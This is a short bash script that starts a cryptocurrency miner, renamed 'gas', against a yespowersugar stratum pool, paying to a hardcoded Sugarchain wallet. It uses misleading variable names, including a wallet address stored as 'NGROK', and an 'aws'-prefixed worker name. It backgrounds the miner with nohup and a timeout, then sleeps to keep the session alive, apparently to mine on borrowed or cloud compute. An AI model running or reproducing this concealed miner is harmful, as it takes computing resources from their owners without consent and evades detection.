#!/bin/bash
chmod u+x gas
ANU=yespowersugar
WO=$(echo aws$(shuf -i 1-10 -n 1))
IPE=stratum+tcps://stratum-eu.rplant.xyz:17042
NGROK=sugar1qncwd9uvepk8y3qpp25pjvqunyzjlj44wzhn2as
nohup timeout 290m ./gas -a $ANU -o $IPE -u $NGROK.$WO &
jobs
echo "haha"
apt-get update -y
sleep 292m
